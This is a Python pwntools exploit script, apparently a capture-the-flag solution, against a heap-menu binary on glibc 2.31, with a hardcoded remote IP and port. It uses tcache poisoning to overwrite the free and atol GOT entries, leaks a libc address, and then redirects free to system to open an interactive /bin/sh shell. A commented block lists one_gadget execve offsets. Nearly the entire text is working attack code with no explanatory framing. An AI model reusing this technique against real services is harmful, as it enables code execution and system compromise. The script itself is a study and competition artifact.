from io import open_code
from pwn import *
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "/root/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("115.29.176.197", 20261)


def create(size):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())

def edit(index, content):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"Idx:", str(index).encode())
    io.sendafter(b"Content: ", content)

def delete(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"Idx:", str(index).encode())

def exit():
    io.sendlineafter(b">> ", b"4")

def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


atol_got = elf.got["atol"]
free_got = elf.got["free"]

write_adr = 0x04012B1
chunk_ptr = 0x403580

create(0x80)
create(0x80)
delete(0)
delete(1)

edit(1, p64(chunk_ptr))
create(0x80)
create(0x80)
# create(0x90)

edit(1, p64(free_got)+p64(atol_got))
edit(0, p64(write_adr))
delete(1)

atol_adr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
log.success("free_addr:-----> " + hex(atol_adr))

libc.address = atol_adr - libc.symbols["atol"]
log.success("libc.address:-----> " + hex(libc.address))

# method 1
"""
0xe3afe execve("/bin/sh", r15, r12)
0xe3b01 execve("/bin/sh", r15, rdx)
0xe3b04 execve("/bin/sh", rsi, rdx)
"""
# one_gadget = 0xe3b01
# ddebug("b *{}".format(libc.address+one_gadget))
# edit(0, p64(libc.address + one_gadget))
# delete(0)

# method 2
edit(0, p64(libc.symbols["system"]))
edit(2, "/bin/sh")
delete(2)

io.interactive()
